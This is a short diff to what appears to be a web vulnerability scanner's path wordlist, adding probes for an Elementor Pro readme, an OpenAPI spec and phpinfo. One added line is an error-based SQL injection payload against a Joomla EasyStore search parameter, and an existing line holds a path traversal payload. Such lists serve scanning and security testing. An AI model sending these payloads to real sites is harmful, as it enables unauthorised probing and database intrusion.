@@ -2286,3 +2286,7 @@
 /jbossmq-httpil/HTTPServerILServlet
 /index.php/guest/get/get_file/..%2f..%2fipconfig.php
 /wp-content/uploads/{{logname}}.log
+/wp-content/plugins/elementor-pro/readme.txt
+/index.php?option=com_easystore&view=products&task=search&filter_sortby=created-ASC,EXTRACTVALUE(1,CONCAT(CHAR(126),SUBSTRING(MD5({{num}}),1,28)))--+-
+/server/specs/oas
+/?phpinfo=TRUE
